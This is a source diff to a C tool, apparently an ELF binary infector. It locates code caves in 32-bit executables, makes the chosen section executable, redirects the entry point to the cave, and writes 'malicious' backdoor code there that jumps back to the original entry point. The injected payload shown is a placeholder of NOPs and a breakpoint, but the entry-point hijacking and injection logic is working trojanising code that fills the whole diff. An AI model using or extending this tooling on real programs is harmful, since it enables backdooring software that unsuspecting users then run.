@@ -284,6 +284,18 @@ int calcCaveVirtualAddress(codecave *cave, int32_t fd, Elf32_Ehdr eh, Elf32_Shdr
 	return currentSection->sh_addr + caveOffset;
 }
 
+void littleEndianToBigEndian(void *addr, int size){
+	char temp;
+	char *p = (char *)addr;
+
+	for (int i = 0; i < size / 2; i++)
+	{
+		temp = *(p + size - i - 1);
+		*(p + size - i - 1) = *(p + i);
+		*(p + i) = temp;
+	}
+}
+
 char *findLongestCave(char *codeSec, int secSize, int *codecaveSize){
 	static const int MIN_LENGTH = 9;
 
@@ -418,30 +430,33 @@ int32_t main(int32_t argc, char *argv[])
 		
 		int cavesNum;
 		codecave *caves = searchCodecaves(fd, eh, sh_tbl, &cavesNum);
-
 		printf("Caves found: %d\n", cavesNum);
 
 		if (cavesNum > 0) codecave_summary(caves, cavesNum);
 
 		codecave *winner = getWinnerCodecave(caves, cavesNum);
 
+		// Make the winner section executable
+		makeSectionExecutable(winner->secName, patchFD, eh, sh_tbl);
+
+		// Change entry point to new cave
+		Elf32_Addr oldEntryPoint = eh.e_entry;
+		eh.e_entry = calcCaveVirtualAddress(winner, patchFD, eh, sh_tbl);
+		writeFileHeader(patchFD, &eh);
+		//int restorationJumpOffset = eh.e_entry - oldEntryPoint;
+
 		// Generating malicious code
+		char oldAddr[4];
+		memcpy(&oldAddr, &oldEntryPoint, 4);
 		int newEntryPointSize;
-		char *malEntryPointCode = generateBackdoorCode("\x41\x42\x43\x44", "\x90\x90\x90\x90\xcc", 5, &newEntryPointSize);
+		littleEndianToBigEndian(oldAddr, 4);
+
+		char *malEntryPointCode = generateBackdoorCode(oldAddr, "\x90\x90\x90\x90\xcc", 5, &newEntryPointSize);
 
 		if(newEntryPointSize > winner->length) {
 			puts("Code injection isn't possible!");
 			exit(1);
 		}
-
-		// Make the winner section executable
-		makeSectionExecutable(winner->secName, patchFD, eh, sh_tbl);
-
-		// Change entry point to new cave
-		eh.e_entry = calcCaveVirtualAddress(winner, patchFD, eh, sh_tbl);
-		writeFileHeader(patchFD, &eh);
-
-		printf("HEXDUMP: %x %x %x %x\n", malEntryPointCode[0], malEntryPointCode[1], malEntryPointCode[2], malEntryPointCode[3]);
 
 		// Write malicious code to code cave
 		lseek(patchFD, (off_t)winner->physicalOffset, SEEK_SET);
